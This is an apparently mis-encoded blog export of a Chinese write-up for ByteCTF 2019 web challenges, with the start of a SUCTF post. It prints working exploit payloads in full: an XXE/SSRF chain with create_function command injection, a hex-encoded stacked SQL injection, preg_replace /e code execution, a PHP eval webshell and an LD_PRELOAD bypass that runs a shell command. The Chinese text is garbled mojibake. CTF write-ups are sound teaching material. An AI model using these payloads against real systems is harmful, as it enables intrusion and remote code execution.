\u0026lt;title\u0026gt;å…ˆçŸ¥å®‰å…¨æŠ€æœ¯ç¤¾åŒº\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;http://xz.aliyun.com/forum/\u0026lt;/link\u0026gt; \u0026lt;description\u0026gt;å…ˆçŸ¥å®‰å…¨æŠ€æœ¯ç¤¾åŒº\u0026lt;/description\u0026gt; \u0026lt;atom:link href=\u0026#34;http://xz.aliyun.com/forum/feed/\u0026#34; rel=\u0026#34;self\u0026#34;\u0026gt;\u0026lt;/atom:link\u0026gt; \u0026lt;language\u0026gt;zh-hans\u0026lt;/language\u0026gt; \u0026lt;lastBuildDate\u0026gt;Sun, 08 Sep 2019 10:15:41 +0800\u0026lt;/lastBuildDate\u0026gt; \u0026lt;item\u0026gt; \u0026lt;title\u0026gt;\u0026amp;xxe;\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;http://xz.aliyun.com/t/6223\u0026lt;/link\u0026gt; \u0026lt;description\u0026gt;CVE-2018-14418 æ“¦å‡ºæ–°ç«èŠ±\u0026lt;/description\u0026gt; \u0026lt;pubDate\u0026gt;Sun, 08 Sep 2019 10:15:41 +0800\u0026lt;/pubDate\u0026gt; \u0026lt;guid\u0026gt;http://xz.aliyun.com/t/6223\u0026lt;/guid\u0026gt; \u0026lt;/item\u0026gt; \u0026lt;/channel\u0026gt; \u0026lt;/rss\u0026gt; Url_parse å¯ä»¥æŒ‰ç…§ä¸Šé¢ boring_code é‚£é¢˜ä½¿ç”¨,æ¥ç»•è¿‡ï¼Œåœ¨è‡ªå·±çš„ç«¯å£èµ·ä¸ª http æœåŠ¡ï¼Œæ”¾ä¸Šé¢çš„ xml æ–‡ä»¶å°±è¡Œäº†ï¼Œç±»ä¼¼http://your_vps:80,baidu.com:80/file\næˆåŠŸè¯»åˆ°/etc/passwdï¼Œä½†æ˜¯è¯»ä¸åˆ°/flagï¼Œæ¥ç€ç”¨ php ä¼ªåè®®è¯»é¢˜ç›®æºç ï¼š\nindex.php\n\u0026lt;?php ini_set(\u0026#39;display_errors\u0026#39;,0); ini_set(\u0026#39;display_startup_erros\u0026#39;,1); error_reporting(E_ALL); require_once(\u0026#39;routes.php\u0026#39;); function __autoload($class_name){ if(file_exists(\u0026#39;./classes/\u0026#39;.$class_name.\u0026#39;.php\u0026#39;)) { require_once \u0026#39;./classes/\u0026#39;.$class_name.\u0026#39;.php\u0026#39;; } else if(file_exists(\u0026#39;./controllers/\u0026#39;.$class_name.\u0026#39;.php\u0026#39;)) { require_once \u0026#39;./controllers/\u0026#39;.$class_name.\u0026#39;.php\u0026#39;; } } routes.php\n\u0026lt;?php Route::set(\u0026#39;index.php\u0026#39;,function(){ Index::createView(\u0026#39;Index\u0026#39;); }); Route::set(\u0026#39;index\u0026#39;,function(){ Index::createView(\u0026#39;Index\u0026#39;); }); Route::set(\u0026#39;fetch\u0026#39;,function(){ if(isset($_REQUEST[\u0026#39;rss_url\u0026#39;])){ Fetch::handleUrl($_REQUEST[\u0026#39;rss_url\u0026#39;]); } }); Route::set(\u0026#39;rss_in_order\u0026#39;,function(){ if(!isset($_REQUEST[\u0026#39;rss_url\u0026#39;]) \u0026amp;\u0026amp; !isset($_REQUEST[\u0026#39;order\u0026#39;])){ Admin::createView(\u0026#39;Admin\u0026#39;); }else{ if($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] == \u0026#39;127.0.0.1\u0026#39; || $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] == \u0026#39;::1\u0026#39;){ Admin::sort($_REQUEST[\u0026#39;rss_url\u0026#39;],$_REQUEST[\u0026#39;order\u0026#39;]); }else{ echo \u0026#34;;(\u0026#34;; } } }); controllers/Admin.php\n\u0026lt;?php class Admin extends Controller{ public static function sort($url,$order){ $rss=file_get_contents($url); $rss=simplexml_load_string($rss,\u0026#39;SimpleXMLElement\u0026#39;, LIBXML_NOENT); require_once \u0026#39;./views/Admin.php\u0026#39;; } } controllers/Fetch.php\n\u0026lt;?php class Fetch extends Controller{ public static function handleUrl($url) { $r = parse_url($url); $invalidUrl = false; if (preg_match(\u0026#39;/aliyun\\.com$/\u0026#39;, $r[\u0026#39;host\u0026#39;]) || preg_match(\u0026#39;/baidu\\.com$/\u0026#39;, $r[\u0026#39;host\u0026#39;]) || preg_match(\u0026#39;/qq\\.com$/\u0026#39;, $r[\u0026#39;host\u0026#39;])) { $rss = Rss::fetch($url); }else { $invalidUrl = true; } require_once \u0026#39;./views/Fetch.php\u0026#39;; } } Rss.php\n\u0026lt;?php class Rss { public static function curl_request($url, $post = \u0026#39;\u0026#39;, $cookie = \u0026#39;\u0026#39;, $headers = \u0026#39;\u0026#39;, $returnHeader = 0) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_USERAGENT, \u0026#39;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)\u0026#39;); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($curl, CURLOPT_AUTOREFERER, 1); curl_setopt($curl, CURLOPT_REFERER, $url); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); if ($post) { curl_setopt($curl, CURLOPT_POST, 1); curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post)); } if ($cookie) { curl_setopt($curl, CURLOPT_COOKIE, $cookie); } if ($headers) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } curl_setopt($curl, CURLOPT_HEADER, 1); curl_setopt($curl, CURLOPT_TIMEOUT, 5); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); $data = curl_exec($curl); if (curl_errno($curl)) { return curl_error($curl); } curl_close($curl); list($header, $body) = explode(\u0026#34;\\r\\n\\r\\n\u0026#34;, $data, 2); $info[\u0026#39;header\u0026#39;] = $header; $info[\u0026#39;body\u0026#39;] = $body; return $info; } public static function fetch($url) { libxml_disable_entity_loader(false); $rss=file_get_contents($url); $rss=simplexml_load_string($rss,\u0026#39;SimpleXMLElement\u0026#39;, LIBXML_NOENT); return $rss; } } view/Admin.php\n\u0026lt;?php if($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] != \u0026#39;127.0.0.1\u0026#39;){ die(\u0026#39;;(\u0026#39;); } ?\u0026gt;\u0026lt;?php include(\u0026#39;package/header.php\u0026#39;) ?\u0026gt; \u0026lt;?php if(!$rss) { ?\u0026gt; \u0026lt;div class=\u0026#34;rss-head row\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;RSSè§£æå¤±è´¥\u0026lt;/h1\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;æ­¤ç½‘ç«™RSSèµ„æºå¯èƒ½å­˜åœ¨é”™è¯¯æ— æ³•è§£æ\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;æ­¤ç½‘ç«™RSSèµ„æºå¯èƒ½å·²ç»å…³é—­\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;æ­¤ç½‘ç«™å¯èƒ½ç¦æ­¢PHPè·å–æ­¤å†…å®¹\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;å¯èƒ½ç”±äºæ¥è‡ªæœ¬ç«™çš„è®¿é—®è¿‡å¤šå¯¼è‡´æš‚æ—¶è®¿é—®é™åˆ¶Orz\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php exit; }; function rss_sort_date($str){ $time=strtotime($str); return date(\u0026#34;Yå¹´mæœˆdæ—¥ Hæ—¶iåˆ†\u0026#34;,$time); } ?\u0026gt; \u0026lt;div\u0026gt; \u0026lt;div class=\u0026#34;rss-head row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-sm-12 text-center\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026#34;\u0026lt;?php echo $rss-\u0026gt;channel-\u0026gt;link;?\u0026gt;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026lt;?php echo $rss-\u0026gt;channel-\u0026gt;title;?\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;span style=\u0026#34;font-size: 16px;font-style: italic;width:100%;\u0026#34;\u0026gt;\u0026lt;?php echo $rss-\u0026gt;channel-\u0026gt;link;?\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;p\u0026gt;\u0026lt;?php echo $rss-\u0026gt;channel-\u0026gt;description;?\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;?php if(isset($rss-\u0026gt;channel-\u0026gt;lastBuildDate)\u0026amp;\u0026amp;$rss-\u0026gt;channel-\u0026gt;lastBuildDate!=\u0026#34;\u0026#34;){ echo \u0026#34;\u0026lt;p\u0026gt; æœ€åæ›´æ–°:\u0026#34;.rss_sort_date($rss-\u0026gt;channel-\u0026gt;lastBuildDate).\u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;article-list\u0026#34; style=\u0026#34;padding:10px\u0026#34;\u0026gt; \u0026lt;?php $data = []; foreach($rss-\u0026gt;channel-\u0026gt;item as $item){ $data[] = $item; } usort($data, create_function(\u0026#39;$a, $b\u0026#39;, \u0026#39;return strcmp($a-\u0026gt;\u0026#39;.$order.\u0026#39;,$b-\u0026gt;\u0026#39;.$order.\u0026#39;);\u0026#39;)); foreach($data as $item){ ?\u0026gt; \u0026lt;article class=\u0026#34;article\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026#34;\u0026lt;?php echo $item-\u0026gt;link;?\u0026gt;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026lt;?php echo $item-\u0026gt;title;?\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p\u0026gt; \u0026lt;?php echo $item-\u0026gt;description;?\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;article-info\u0026#34;\u0026gt; \u0026lt;i style=\u0026#34;margin:0px 5px\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;?php echo rss_sort_date($item-\u0026gt;pubDate);?\u0026gt; \u0026lt;i style=\u0026#34;margin:0px 5px\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;?php for($i=0;$i\u0026lt;count($item-\u0026gt;category);$i++){ echo $item-\u0026gt;category[$i]; if($i+1!=count($item-\u0026gt;category)){ echo \u0026#34;,\u0026#34;; } }; if(isset($item-\u0026gt;author)\u0026amp;\u0026amp;$item-\u0026gt;author!=\u0026#34;\u0026#34;){ ?\u0026gt; \u0026lt;i class=\u0026#34;fa fa-user\u0026#34; style=\u0026#34;margin:0px 5px\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;?php echo $item-\u0026gt;author; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/article\u0026gt; \u0026lt;?php }?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;text-center\u0026#34;\u0026gt; å…è´£å£°æ˜:æœ¬ç«™åªæä¾›RSSè§£æ,è§£æå†…å®¹ä¸æœ¬ç«™æ— å…³,ç‰ˆæƒå½’æ¥æºç½‘ç«™æ‰€æœ‰ \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php include(\u0026#39;package/footer.php\u0026#39;) ?\u0026gt; æˆ‘ä»¬å¯ä»¥åœ¨ view/Admin.php ä¸­çœ‹åˆ°å…³é”®ç‚¹\nusort($data, create_function(\u0026#39;$a, $b\u0026#39;, \u0026#39;return strcmp($a-\u0026gt;\u0026#39;.$order.\u0026#39;,$b-\u0026gt;\u0026#39;.$order.\u0026#39;);\u0026#39;)); è¿™æ˜¯ä¸ªåœ¨ FireShell CTF 2019 å‡ºè¿‡çš„è€ƒç‚¹ï¼Œå› ä¸ºcreate_functionå¯ä»¥è¿›è¡Œä»£ç æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥æœ‰ä»¥ä¸‹è¿™ç§æ“ä½œ\nid,id);};die(system(\u0026#39;ls -la /\u0026#39;));/* è¿™æ ·å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨ xxe ä¸­æ„é€ ä¸€ä¸ª ssrf ç»•è¿‡ 127.0.0.1 çš„åˆ¤æ–­å°±è¡Œäº†\nphp://filter/convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=http%3A%2F%2F122.112.199.14%2Fexample\u0026amp;order=id%2Cid)%3B%7D%3Bdie(system('ls%20-la%20%2F'))%3B%2F* åœ¨/flag_eb8ba2eb07702e69963a7d6ab8669134æ‹¿åˆ° flag\nbabyblog è¿™ä¸ªé¢˜æœ€åæ²¡å•¥æ—¶é—´åšäº†ï¼Œæ¯”è¾ƒå¯æƒœã€‚èµ›åå¤ç›˜äº†ä¸€ä¸‹ï¼Œä»”ç»†çœ‹çœ‹ä¹Ÿæ²¡å¤ªå¤§çš„éš¾åº¦ï¼Œå±äºè¿˜ç®—æ¯”è¾ƒç®€å•çš„ã€‚\næ‰«æå¯ä»¥æ‹¿åˆ° www.zip ï¼Œæ‹¿åˆ°æºç ï¼Œè¿›è¡Œå®¡è®¡ã€‚\nåœ¨ replace.php ä¸­æœ‰ç»è¿‡$row['isvip'] == 1åˆ¤æ–­æ‰èƒ½ä½¿ç”¨çš„åŠŸèƒ½ï¼Œåœ¨ register.php ä¸­æœ‰\n$sql-\u0026gt;query(\u0026#34;insert into users (username,password,isvip) values (\u0026#39;$username\u0026#39;, \u0026#39;$password\u0026#39;,0);\u0026#34;); æ¯æ¬¡æ³¨å†Œisvipè¢«è®¾ç½®ä¸º 0 çš„ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸ªæ³¨å…¥ç‚¹æŠŠæˆ‘ä»¬è®¾ç½®ä¸º vip\nå…³é”®ç‚¹å°±åœ¨ edit.php å½“ä¸­ï¼š\nif(isset($_POST[\u0026#39;title\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;content\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;id\u0026#39;])){ foreach($sql-\u0026gt;query(\u0026#34;select * from article where id=\u0026#34; . intval($_POST[\u0026#39;id\u0026#39;]) . \u0026#34;;\u0026#34;) as $v){ $row = $v; } if($_SESSION[\u0026#39;id\u0026#39;] == $row[\u0026#39;userid\u0026#39;]){ $title = addslashes($_POST[\u0026#39;title\u0026#39;]); $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql-\u0026gt;query(\u0026#34;update article set title=\u0026#39;$title\u0026#39;,content=\u0026#39;$content\u0026#39; where title=\u0026#39;\u0026#34; . $row[\u0026#39;title\u0026#39;] . \u0026#34;\u0026#39;;\u0026#34;); exit(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Edited successfully.\u0026#39;);location.href=\u0026#39;index.php\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;); }else{ exit(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;You do not have permission.\u0026#39;);history.go(-1);\u0026lt;/script\u0026gt;\u0026#34;); } } å…¶ä¸­\n$sql-\u0026gt;query(\u0026#34;update article set title=\u0026#39;$title\u0026#39;,content=\u0026#39;$content\u0026#39; where title=\u0026#39;\u0026#34; . $row[\u0026#39;title\u0026#39;] . \u0026#34;\u0026#39;;\u0026#34;); $row['title']æ˜¯ä¸Šé¢ sql è¯­å¥å–å‡ºæ¥çš„ç»“æœï¼Œè€Œtitleåœ¨ writing.php æ’å…¥çš„æ—¶å€™ï¼Œè™½ç„¶åšäº†é˜²æ³¨å…¥ï¼Œä½¿ç”¨addslashesè½¬ä¹‰äº†titleçš„å†…å®¹\nif(isset($_POST[\u0026#39;title\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;content\u0026#39;])){ $title = addslashes($_POST[\u0026#39;title\u0026#39;]); $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql-\u0026gt;query(\u0026#34;insert into article (userid,title,content) values (\u0026#34; . $_SESSION[\u0026#39;id\u0026#39;] . \u0026#34;, \u0026#39;$title\u0026#39;,\u0026#39;$content\u0026#39;);\u0026#34;); exit(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Posted successfully.\u0026#39;);location.href=\u0026#39;index.php\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;); } ä½†æ˜¯åœ¨ä¸Šé¢æœªç»ä»»ä½•å¤„ç†åˆç›´æ¥å–å‡ºæ¥ä¼šå¯¼è‡´äºŒæ¬¡æ³¨å…¥ï¼Œä¾‹å¦‚ç¬¬ä¸€æ¬¡æ’å…¥'1ï¼Œç»è¿‡addlashesè½¬ä¹‰ï¼Œsql è¯­å¥å˜æˆ\ninsertintoarticle(userid,title,content)values(\u0026#34;1\u0026#34;,\u0026#39;\\\u0026#39;1\u0026#39;,\u0026#39;1\u0026#39;);\u0026#34; ä½†æ˜¯æ’å…¥æ•°æ®åº“çš„å†…å®¹æ˜¯'1ï¼Œå–å‡ºæ¥çš„æ—¶å€™ä¹Ÿæ˜¯'1ï¼Œè¿™å°±å¯¼è‡´äº†æ³¨å…¥ã€‚\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹è¿›è¡Œæ³¨å…¥ï¼Œupdate æˆ‘ä»¬çš„ isvip å­—æ®µå°±è¡Œ\n';update users set isvip=1 where username='zedd'; æ¥ä¸‹æ¥å°±æ˜¯é‚£ä¸ªå¥‡è‘©æ­£åˆ™äº†ï¼š\n$filter = \u0026#34;benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|load_file\\s*?\\\\(|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)\u0026#39;\\\u0026#34;\\\\d]+?=[\\\\(\\\\)\u0026#39;\\\u0026#34;\\\\d]+?|[\\\\(\\\\)\u0026#39;\\\u0026#34;a-zA-Z]+?=[\\\\(\\\\)\u0026#39;\\\u0026#34;a-zA-Z]+?|\u0026gt;|\u0026lt;|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\u0026#34;\u0026#39;])|\\\\/\\\\*.*\\\\*\\\\/|\u0026lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT\\s*(\\(.+\\)\\s*|@{1,2}.+?\\s*|\\s+?.+?|(`|\u0026#39;|\\\u0026#34;).*?(`|\u0026#39;|\\\u0026#34;)\\s*)|UPDATE\\s*(\\(.+\\)\\s*|@{1,2}.+?\\s*|\\s+?.+?|(`|\u0026#39;|\\\u0026#34;).*?(`|\u0026#39;|\\\u0026#34;)\\s*)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?|(`|\u0026#39;|\\\u0026#34;).*?(`|\u0026#39;|\\\u0026#34;)|(\\+|-|~|!|@:=|\u0026#34; . urldecode(\u0026#39;%0B\u0026#39;) . \u0026#34;).+?)FROM(\\\\(.+\\\\)|\\\\s+?.+?|(`|\u0026#39;|\\\u0026#34;).*?(`|\u0026#39;|\\\u0026#34;))|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\u0026#34;; if(preg_match(\u0026#39;/\u0026#39; . $filter . \u0026#39;/is\u0026#39;, $value)){ exit(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Failure!Do not use sensitive words.\u0026#39;);location.href=\u0026#39;index.php\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;); } çœ‹èµ·æ¥è™½ç„¶è¿‡æ»¤äº†å¾ˆå¤šï¼Œä½†æ˜¯æˆ‘ä»¬ä¾ç„¶å¯ä»¥ä½¿ç”¨å †å æ³¨å…¥æ¥ç»•è¿‡ï¼š\nset@t=0x73656c65637420312c323b;preparexfrom@t;executex;æ‰€ä»¥æˆ‘ä»¬æŠŠä¸Šé¢çš„ sql è¯­å¥æ¢æˆ16è¿›åˆ¶ï¼Œå°±è¡Œäº†\n\u0026#39;;set @t=0x757064617465207573657273207365742069737669703d3120776865726520757365726e616d653d277a656464273b;prepare x from @t;execute x; æˆä¸º vip ä¹‹åçœ‹åˆ° replace.php å½“ä¸­çš„å†…å®¹ï¼š\n$content = addslashes(preg_replace(\u0026#34;/\u0026#34; . $_POST[\u0026#39;find\u0026#39;] . \u0026#34;/\u0026#34;, $_POST[\u0026#39;replace\u0026#39;], $row[\u0026#39;content\u0026#39;])); æ¯”è¾ƒæ˜æ˜¾çš„ä¸€ä¸ªåˆ©ç”¨ php æ­£åˆ™/eæ‰§è¡Œå‘½ä»¤çš„å†™æ³•ï¼Œå¯ä»¥ä½¿ç”¨%00æˆªæ–­æœ€åçš„ä¸€ä¸ªæ–œæ ï¼Œåœ¨$_POST['find']ä¸­ä½¿ç”¨/eä¿®é¥°ç¬¦\nfind=/e%00\u0026amp;replace=phpinfo();\u0026amp;regex=1\u0026amp;id=2 POST ä¹‹åæ‹¿åˆ° phpinfo ä¿¡æ¯ï¼ŒWeb æ ¹ç›®å½• /var/www/htmlï¼Œ disable_functions :\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,ini_set,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail è¿˜æœ‰putenvï¼Œè€ƒçƒ‚äº†çš„ LD_PRELOAD ç»•è¿‡ï¼Œç›´æ¥å†™ä¸ª webshell :\nfind=/e%00\u0026amp;replace=file_put_contents('/var/www/html/webshell.php','\u0026lt;?php eval($_POST[a]);');\u0026amp;regex=1\u0026amp;id=2 å‘ç°è¿˜æœ‰ basedir çš„é™åˆ¶ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹åˆ—ç›®å½•\nif ($dh = opendir(\u0026#34;glob:///*\u0026#34;)) { while (($file = readdir($dh)) !== false) { echo \u0026#34;$file\\n\u0026#34;; } closedir($dh); } åœ¨æ ¹ç›®å½•æœ‰/readflagï¼Œç›´æ¥å†™ä¸€ä¸ª so æ–‡ä»¶å°±è¡Œäº†\n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;sys/types.h\u0026gt;#include \u0026lt;sys/stat.h\u0026gt;#include \u0026lt;signal.h\u0026gt; void pwn(void) { system(\u0026#34;/readflag \u0026gt; /var/www/html/res 2\u0026gt;\u0026amp;1\u0026#34;); } void getpid(){ unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); pwn(); } åœ¨å½“å‰ web ç›®å½•æ‹¿åˆ° flagã€‚//å› ä¸ºæ˜¯å¤ç°ç¯å¢ƒå°±æ— æ‰€è°“äº†ã€‚\ndot_server_prove è¿™ä¸ªé¢˜æ¯”èµ›çš„æ—¶å€™æ²¡æ€ä¹ˆçœ‹ï¼Œçœ‹äº† bytesCTF dot_server_prove WriteUPï¼Œç®€å•æ€»ç»“ä¸€ä¸‹æ¶‰åŠçš„çŸ¥è¯†ç‚¹ï¼š\n é€†å‘ bin æ–‡ä»¶æŸ¥çœ‹é€»è¾‘ï¼Œæ ¹æ® host æ¥è®¿é—®ä¸åŒçš„ç«™ç‚¹ï¼Œå°±åƒ apache çš„ virtualhost ä¸€æ ·ï¼Œè¯»å– log æ¥ä¿å­˜ä½ çš„ ua åœ¨ ua å¤„è¿›è¡Œ xss ï¼Œè¯»å–é¡µé¢æœ‰ ssrf ssrf æ‰“ dict://172.18.0.3:6379/info å¾—åˆ° redis ç‰ˆæœ¬å· 4.x é€šè¿‡ gopher åˆ©ç”¨ä¸»ä»å¤åˆ¶çš„è¿›è¡Œ RCE  iCloudMusic æ‰“ç®—ä¸ SUCTF çš„ iCloudMusic æ”¾ä¸€èµ·å†™å§\nConclusion é¢˜ç›®éƒ½ä¸ç®—ç‰¹åˆ«éš¾ï¼Œé™¤äº†é©¬å¸ˆå‚…çš„ iCloudMusic è·Ÿ dot_server_prove ï¼Œä¸¤ä¸ªä¸æ˜¯å¾ˆæ‘¸å¾—ç€å¤´è„‘çš„é¢˜ï¼Œ Web1/2/3 éƒ½æœ‰ç‚¹é­”æ”¹å‡‘é¢˜çš„å«Œç–‘ï¼Œè¿™å‡ é¢˜å¹¶æ²¡æœ‰ç‰¹åˆ«äº®çœ¼çš„çŸ¥è¯†ç‚¹ï¼Œéƒ½å±äºè€ƒè¿‡çš„ï¼Œåé¢ä¸¤é¢˜è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ï¼Œdot_server_prove å¯èƒ½ä¸æ˜¯å¾ˆ get åˆ°ç‚¹ï¼Œæ¯•ç«Ÿä¹Ÿå±äºä¸€ä¸ªæ¯”è¾ƒæ–°é¢–çš„é¢˜ç›®äº†ï¼Œä»¥åŠé©¬å¸ˆå‚…çš„ iCloudMusic ï¼Œæ¯•ç«Ÿä¹Ÿæ˜¯ä¸“é—¨ç ”ç©¶äº†ä¸€ä¸ªå¤šæœˆçš„ electron orz\u0026hellip;è¿˜æ˜¯æœ‰ä¸€ç‚¹æ”¶è·çš„ï¼Œå¸Œæœ›çº¿ä¸‹èµ›ä¸ä¼šè¢«æ‰“çˆ† orz\u0026hellip;\n","date":"2019-09-17T10:11:20Z","permalink":"https://blog.zeddyu.info/2019/09/17/bytectf2019/","title":"ByteCTF 2019 Web WP"},{"content":"è¿™æ¬¡æˆ‘ç»™ SUCTF å‡ºäº†ä¸‰é“ Webï¼Œåˆ†åˆ«æ˜¯ CheckIn ã€ pythonginx ã€ Upload Labs 2ï¼Œä¸‹é¢èŠä¸€ä¸‹å‡ºé¢˜æ—¶å€™çš„ä¸€äº›æ€è·¯ä»¥åŠéšæƒ³ï¼Œè¿˜æœ‰æœ€è¿‘å¯¹äº phar çš„ä¸€äº›æ·±å…¥æŒ–æ˜ã€‚\nCheckIn å…³äº CheckIn è¿™é“é¢˜ï¼Œæ˜¯æˆ‘åœ¨çœ‹ php æ–‡æ¡£æ—¶å€™ç¿»åˆ°çš„ä¸€ä¸ªå…³äº .user.ini çš„è¯´æ˜ï¼Œç„¶åå‚è€ƒäº† user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨ï¼Œå› ä¸ºæ˜¯æ¯”è¾ƒä¹…è¿œçš„ä¸œè¥¿äº†ï¼Œè€Œä¸”æˆ‘çœ‹å¾ˆå¤šä»€ä¹ˆä¸Šä¼ æ•™ç¨‹ï¼Œç”šè‡³æˆ‘è®¤ä¸ºæ€»ç»“æ¯”è¾ƒå…¨é¢çš„upload labs éƒ½æœªæ›¾æåŠåˆ°è¿™ä¸ª trick ï¼Œè€Œä¸”å›å¿†äº†ä¸€ä¸‹ä»¥åŠç²—ç•¥æœäº†ä¸€ä¸‹ï¼Œéƒ½æ²¡æœ‰å‘ç°æœ‰è¿‡ CTF å‡ºè¿‡è¿™ä¸ª trick ï¼Œä½†æ˜¯åˆæ¯”è¾ƒç®€å•ï¼Œæˆ‘çŒœè‚¯å®šè¿˜æœ‰äº›äººå¹¶ä¸çŸ¥é“è¿™ä¸ª trick ï¼Œæ‰€ä»¥å°±æ”¾åœ¨äº† web1 ä½œä¸ºç­¾åˆ°çš„é¢˜ç›®ã€‚\nå‡ºé¢˜çš„æ—¶å€™ç›´æ¥æ‹¿äº†å›½èµ›åä¸œåŒ—èµ›åŒºä¸€ä¸ªé¢˜ç›®æºç æ¥æ”¹çš„ï¼ŒåŸæœ¬æ˜¯æƒ³ç›´æ¥ ban æ‰htaccessçš„ï¼ŒèŠ‚çœå¤§å®¶çš„æ—¶é—´ï¼Œä¸è¦è®©å¤§å®¶çš„æ€è·¯è·‘åã€‚ç»“æœæ‰“é”™äº†æˆäº†htacess\u0026hellip;ç„¶åå°±æœ‰ä¸€ç¾¤å¸ˆå‚…è·‘åäº†\u0026hellip;åˆå› ä¸ºæƒé™çš„é—®é¢˜è¿˜è¢«æ…å±äº†\u0026hellip;ç»™å¸ˆå‚…ä»¬è°¢ç½ªäº†å“å“å“\npythonginx pythonginx æ²¡ä»€ä¹ˆç‰¹åˆ«å¥½è¯´çš„\u0026hellip;æ˜¯æˆ‘æ€ç»´å¤ªå±€é™äº†\u0026hellip;å¯¼è‡´å˜æˆäº†çŒœ flag ä½ç½®çš„é¢˜ï¼Œè¿™é¢˜æˆ‘æ˜¯æˆ‘å‰å‡ å¤©åœ¨ black hat ä¸Šçœ‹åˆ° us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf ä¸€ä¸ªæ¯”è¾ƒå¥½ç©çš„ä¸œè¥¿ï¼Œæ­£å¥½æ‹¿æ¥å‡ºé¢˜åˆ†äº«ç»™å¤§å®¶ï¼Œå‡ºé¢˜æ€è·¯åœ¨äºç”¨ â„† è¿™ä¸ªå­—ç¬¦å»è¯»å– /userç›®å½•ä¸‹çš„æ•æ„Ÿæ–‡ä»¶ã€‚\nUpload Labs 2 å…¶å®è¿™é¢˜æœ€å admin.php 